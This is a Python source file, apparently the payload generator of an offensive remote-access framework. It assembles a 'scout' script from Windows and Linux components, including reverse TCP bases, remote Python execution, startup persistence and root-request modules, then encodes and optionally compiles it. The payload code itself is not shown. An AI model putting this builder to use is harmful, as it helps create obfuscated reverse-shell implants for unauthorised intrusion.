# WEB + COM
# done
import library.modules.dynamic_help_generator as dynamic_help_generator
import library.modules.compiler as compiler
import library.modules.config as config
import library.modules.clean_import_data as clean_import_data
import os
config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify
    from json import loads

tmp_win = list(config.win_components.values())
tmp_win.append('windows/bases/reverse_tcp_base')
for i in tmp_win:
    exec ('import components.' + i.replace('/', '.') + ' as ' + i.replace('/', '_'))
print(config.pos + 'Loaded all windows components into generator - OK')
tmp_lin = list(config.lin_components.values())
tmp_lin.append('linux/bases/reverse_tcp_base')
for i in tmp_lin:
    exec ('import components.' + i.replace('/', '.') + ' as ' + i.replace('/', '_'))
print(config.pos + 'Loaded all linux components into generator - OK')
tmp_enc = list(config.encoders.values())
for i in tmp_enc:
    exec ('import encoders.' + i.replace('/', '.') + ' as ' + i.replace('/', '_'))
print(config.pos + 'Loaded all encoders into generator - OK')


def main(prompt = None):
    try:
        original = os.getcwd()
        os.chdir(config.started_at)
        comp_list = sorted([i for i in config.loaded_components.values() if not i.endswith('_base')])
        conditions = loads(prompt.split(' ', 1)[1])
        for i in config.loaded_components.values():
            if i.endswith('_base'):
                comp_list.insert(0, i)
        for i in comp_list:
            if interface == "GUI":
                config.app.logger.info("[library/commands/generator_interface/generate] - Loading and executing : " + i)
            elif interface == "CUI":
                print(config.pos + 'Loading and executing : ' + i)
            if interface == "GUI":
                if i == "windows/control/execute_python" or i == "linux/control/execute_python" or i == "windows/startup/sleep" or i == "linux/startup/sleep" or i == "linux/startup/req_root":
                    exec (i.replace('/', '_') + '.main("generate", \'' + prompt.split(' ', 1)[1] + '\')')
                else:
                    exec(i.replace('/', '_') + '.main("generate")')
            elif interface == "CUI":
                exec(i.replace('/', '_') + '.main("generate")')
        if interface == "GUI":
            config.app.logger.info("[library/commands/generator_interface/generate] - Reading contents from temporary written file...")
        elif interface == "CUI":
            print(config.inf + 'Reading contents from temporary written file...')
        with open(config.scout_values['Path'][0], 'r') as f:
            save_data = f.read()
        config.functions = list(set(config.functions))
        config.import_statements = list(set(config.import_statements))
        config.global_objs = list(set(config.global_objs))
        config.logics = list(set(config.logics))
        with open(config.scout_values['Path'][0], 'w') as f:
            if interface == "GUI":
                config.app.logger.info("[library/commands/generator_interface/generate] - Writing in imports...")
            elif interface == "CUI":
                print(config.inf + 'Writing in imports...')
            f.write(clean_import_data.main(config.import_statements) + '\n\n')
            if interface == "GUI":
                config.app.logger.info("[library/commands/generator_interface/generate] - Writing in help menu...")
            elif interface == "CUI":
                print(config.inf + 'Writing in help menu...')
            f.write('help_menu = ' + "'''" + dynamic_help_generator.main() + "'''" + '\n')
            if interface == "GUI":
                config.app.logger.info("[library/commands/generator_interface/generate] - Writing in global variables...")
            elif interface == "CUI":
                print(config.inf + 'Writing in global variables...')
            for i in config.global_objs:
                f.write(i + '\n')
            if interface == "GUI":
                config.app.logger.info("[library/commands/generator_interface/generate] - Writing in components...")
            elif interface == "CUI":
                print(config.inf + 'Writing in components...')
            for i in config.functions:
                f.write(i + '\n')
            if interface == "GUI":
                config.app.logger.info("[library/commands/generator_interface/generate] - Writing in startup components...")
            elif interface == "CUI":
                print(config.inf + 'Writing in startup components...')
            for i in config.startup_start:
                f.write(i + '\n')
            for i in config.startup:
                f.write(i + '\n')
            for i in config.startup_end:
                f.write(i + '\n')
            f.write("comp_list = " + str(comp_list) + "\n")
            if interface == "GUI":
                config.app.logger.info("[library/commands/generator_interface/generate] - Writing in base component...")
            elif interface == "CUI":
                print(config.inf + 'Writing in base component...')
            for i in config.logics:
                save_data = save_data.replace('#Statements#', '#Statements#' + i)
            save_data = save_data.replace('#Statements#', '')
            f.write(save_data)

        if config.loaded_encoders:
            for i in config.loaded_encoders:
                if interface == "GUI":
                    config.app.logger.info("[library/commands/generator_interface/generate] - Encoding with encoder : " + i)
                elif interface == "CUI":
                    print(config.pos + 'Encoding with encoder : ' + i)
                exec (i + '.main("encode")')
        if config.scout_values['Compile'][0] == 'True':
            if interface == "GUI":
                config.app.logger.info("[library/commands/generator_interface/generate] - Compiling scout...")
            elif interface == "CUI":
                print(config.inf + 'Compiling scout...')
            if interface == "GUI":
                output = compiler.main(config.scout_values['Path'][0], conditions)
            elif interface == "CUI":
                compiler.main(config.scout_values['Path'][0])
        if interface == "GUI":
            config.app.logger.info("[library/commands/generator_interface/generate] - Successfully generated scout python file to : " + os.path.join(os.getcwd(), config.scout_values['Path'][0]))
        elif interface == "CUI":
            print(config.pos + 'Successfully generated scout python file to : ' + os.path.join(os.getcwd(),
                                                                                           config.scout_values['Path'][
                                                                                               0]))
        config.functions = []
        config.import_statements = []
        config.global_objs = []
        config.logics = []
        config.startup = []
        config.startup_end = []
        config.startup_start = []
        config.help_menu = {}
        os.chdir(original)
        if interface == "GUI":
            try:
                return output
            except:
                return jsonify({"output": "Success", "output_message": "Generation successful", "data": ""})
    except IOError as e:
        if interface == "GUI":
            config.app.logger.error("\x1b[1m\x1b[31m[library/commands/generator_interface/generate] - File error (Is another process using a file of the same filepath?)\x1b[0m")
            return jsonify({"output": "Fail", "output_message": "File error (Is another process using a file of the same filepath?)", "data": ""})
        elif interface == "CUI":
            print(config.neg + 'File error (Is another process using a file of the same filepath?)')
    except Exception as e:
        if interface == "GUI":
            config.app.logger.error("\x1b[1m\x1b[31m[library/commands/generator_interface/generate] - Error: " + str(e) + "\x1b[0m")
            return jsonify({"output": "Fail", "output_message": str(e), "data": ""})
